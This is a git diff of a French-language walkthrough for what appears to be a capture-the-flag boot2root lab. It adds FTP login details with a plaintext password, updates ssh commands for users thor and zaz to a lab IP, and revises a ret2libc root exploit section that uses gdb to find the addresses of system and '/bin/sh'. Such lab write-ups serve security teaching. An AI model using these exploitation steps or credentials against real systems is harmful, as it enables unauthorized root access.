@@ -68,6 +68,13 @@ lmezard:G!@M6f4Eatau{sF"
 ```
 Ces identifiants nous permettent de nous connecter en FTP avec le port 21.
 
+Pour se connecter en ftp, on utilise filezilla.
+On a besoin de `l'hote`, d'un `identifiant`, d'un `mot de passe` et d'un `port`
+
+```
+192.168.56.101 lmezard G!@M6f4Eatau{sF" 21
+```
+
 ## Connexion ssh
 Grâce à notre connexion ftp, on remarque qu’on a accès à 2 fichiers :
 - Un README contenant `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.
@@ -493,7 +500,7 @@ Publicspeakingisveryeasy.126241207201b2149opekma426315
 
 On peut donc se connecter en ssh avec l'utiliseur thor :
 ```
-ssh -p 22 thor@192.168.99.102
+ssh -p 22 thor@192.168.56.101
 ```
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
@@ -512,7 +519,7 @@ En arrivant sur le compte de `thor`, on remarque :
  ```
 On peut ainsi se connecter avec l'utilisateur zaz en ssh :
 ```
-ssh -p 22 zaz@192.168.99.102
+ssh -p 22 zaz@192.168.56.101
 ```
 
 ## Root
@@ -536,27 +543,37 @@ Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.
 ### Adressage
 Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction `system` et de la chaine `"/bin/sh"`. Le but étant de faire un call à `system` avec ce paramètre. Pour cela, on exécute `gdb` sur notre exécutable avec les commandes suivante :
 ```
-gdb exploit_me
+> gdb exploit_me
 [...]
-(gdb) break main
+> (gdb) break main
 [...]
-(gdb) run
+> (gdb) run
 [...]
 ```
 
 #### system
 
 ```
-(gdb) p system
+> (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 L'adresse de `system` est `0xb7e6b060`.
 
 #### /bin/sh
 
-En hexadécimal, `/bin/sh` = `0xb7fa92e8`.
 ```
-(gdb) x/s 0xb7fa92e8
+> (gdb) find __libc_start_main,+99999999,"/bin/sh"
+[...]
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
+
+Si on regarde dans cette addresse, on voit bien que c'est /bin/sh
+
+```
+> (gdb) x/s 0xb7f8cc58
+[...]
 0xb7f8cc58:	 "/bin/sh"
 ```
 L'adresse de `"/bin/sh"` est `0xb7f8cc58`.
